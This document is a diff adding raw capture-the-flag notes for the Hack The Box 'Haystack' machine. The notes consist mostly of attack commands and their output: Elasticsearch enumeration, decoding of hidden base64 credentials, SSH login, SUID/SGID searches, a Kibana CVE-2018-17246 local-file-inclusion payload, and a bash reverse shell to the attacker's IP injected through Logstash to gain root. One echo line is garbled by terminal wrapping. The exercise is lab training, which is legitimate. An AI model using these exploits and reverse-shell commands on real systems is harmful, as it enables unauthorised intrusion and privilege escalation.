@@ -1,0 +1,200 @@
+{
+  "name" : "iQEYHgS",
+  "cluster_name" : "elasticsearch",
+  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
+  "version" : {
+    "number" : "6.4.2",
+    "build_flavor" : "default",
+    "build_type" : "rpm",
+    "build_hash" : "04711c2",
+    "build_date" : "2018-09-26T13:34:09.098244Z",
+    "build_snapshot" : false,
+    "lucene_version" : "7.4.0",
+    "minimum_wire_compatibility_version" : "5.6.0",
+    "minimum_index_compatibility_version" : "5.0.0"
+  },
+  "tagline" : "You Know, for Search"
+}
+
+Basic Query
+10.10.10.115:9200/_search?q=
+
+Full Query
+10.10.10.115:9200/_search?source={Query-as-JSON}
+
+
+msf5 auxiliary(scanner/elasticsearch/indices_enum) > run
+
+[+] ElasticSearch Indices found: .kibana, .monitoring-es-6-2019.06.29, .monitoring-kibana-6-2019.06.29, bank, quotes
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+curl -X GET "<host>:9200/<indices>/_search" -H 'Content-Type: application/json' -d'{"query": { "match_all": {} }}'
+
+
+root@kali:~/HTB/Haystack# strings needle.jpg
+......
+bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
+
+>>> a = "bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg=="
+>>> import base64
+>>> b = base64.b64decode(a)
+>>> print(b)
+b'la aguja en el pajar es "clave"'
+
+http://10.10.10.115:9200/_search?q=clave
+
+>>> c = "dXNlcjogc2VjdXJpdHkg"
+>>> d = base64.b64decode(c)
+>>> print(d)
+b'user: security '
+>>> e = "cGFzczogc3BhbmlzaC5pcy5rZXk="
+>>> f = base64.b64decode(e)
+>>> print(f)
+b'pass: spanish.is.key'
+
+root@kali:~/HTB/Haystack# ssh security@haystack.htb
+The authenticity of host 'haystack.htb (10.10.10.115)' can't be established.
+ECDSA key fingerprint is SHA256:ihn2fPA4jrn1hytN0y9Z3vKpIKuL4YYe3yuESD76JeA.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'haystack.htb,10.10.10.115' (ECDSA) to the list of known hosts.
+security@haystack.htb's password: 
+Last login: Sat Jun 29 18:33:25 2019 from 10.10.19.144
+[security@haystack ~]$ whoami
+security
+[security@haystack ~]$ ls -a
+.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  pspy64  user.txt  .viminfo
+[security@haystack ~]$ cat user.txt
+04d18bc79dac1d4d48ee0a940c8eb929
+[security@haystack ~]$ 
+
+[security@haystack ~]$ uname -a
+Linux haystack 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+[security@haystack ~]$ 
+[security@haystack ~]$ env
+XDG_SESSION_ID=11
+HOSTNAME=haystack
+SELINUX_ROLE_REQUESTED=
+TERM=xterm-256color
+SHELL=/bin/bash
+HISTSIZE=1000
+SSH_CLIENT=10.10.16.45 43488 22
+SELINUX_USE_CURRENT_RANGE=
+SSH_TTY=/dev/pts/10
+USER=security
+LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:do=38;5;5:bd=48;5;232;38;5;11:cd=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:
+MAIL=/var/spool/mail/security
+PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/security/.local/bin:/home/security/bin
+PWD=/home/security
+LANG=en_US.UTF-8
+SELINUX_LEVEL_REQUESTED=
+HISTCONTROL=ignoredups
+SHLVL=1
+HOME=/home/security
+LOGNAME=security
+SSH_CONNECTION=10.10.16.45 43488 10.10.10.115 22
+LESSOPEN=||/usr/bin/lesspipe.sh %s
+XDG_RUNTIME_DIR=/run/user/1000
+_=/usr/bin/env
+
+[security@haystack ~]$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+[security@haystack ~]$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/crontab
+/usr/bin/passwd
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+[security@haystack ~]$ 
+
+[security@haystack ~]$ find / -perm -2000 -type f 2>/dev/null
+/tmp/systemctl
+/usr/bin/wall
+/usr/bin/write
+/usr/bin/ssh-agent
+/usr/sbin/netreport
+/usr/sbin/postdrop
+/usr/sbin/postqueue
+/usr/libexec/utempter/utempter
+/usr/libexec/openssh/ssh-keysign
+[security@haystack ~]$ 
+
+Tunnel to kibana
+root@kali:~/HTB/Haystack# ssh -nNT -L 5601:127.0.0.1:5601 security@haystack.htb
+security@haystack.htb's password: 
+
+        
+CVE-2018-17246 - Kibana LFI < 6.4.3 & 5.6.13
+Upload shell and use lfi to exec
+localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/shell.js
+
+
+root@kali:~/HTB/Haystack# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.45] from haystack.htb [10.10.10.115] 38714
+whoami
+kibana
+python -c 'import pty;pty.spawn("/bin/bash");'
+bash-4.2$ pwd
+pwd
+/
+bash-4.2$ 
+
+bash-4.2$ /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d
+/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d
+OpenJDK 64-Bit Server VM warning: If the number of processors is expected to increase from one, then you should configure the number of parallel GC threads appropriately using -XX:ParallelGCThreads=N
+
+
+
+bash-4.2$ echo "Ejecutar comando : /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.45/4444 0>&1'" > /opt/kibana/logstash_fuck
+echo "Ejecutar comando : /bin/bash -c '/bin/bash -i >& /dev/tcp/<mando : /bin/bash -c '/bin/bash -i >& /dev/tcp/10.1            </bash -i >& /dev/tcp/10.10.16.45/4444 0>&1'" > /opt            /kibana/logstash_fuck
+
+ash-4.2$ /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/
+/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/
+OpenJDK 64-Bit Server VM warning: If the number of processors is expected to increase from one, then you should configure the number of parallel GC threads appropriately using -XX:ParallelGCThreads=N
+WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using --path.settings. Continuing using the defaults
+Could not find log4j2 configuration at path /usr/share/logstash/config/log4j2.properties. Using default config which logs errors to the console
+
+root@kali:~# nc -lvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.45] from haystack.htb [10.10.10.115] 58148
+bash: no hay control de trabajos en este shell
+[root@haystack /]# ls -a
+ls -a
+.
+..
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+[root@haystack /]# cat /root/root.txt
+cat /root/root.txt
+3f5f727c38d9f70e1d2ad2ba11059d92
+
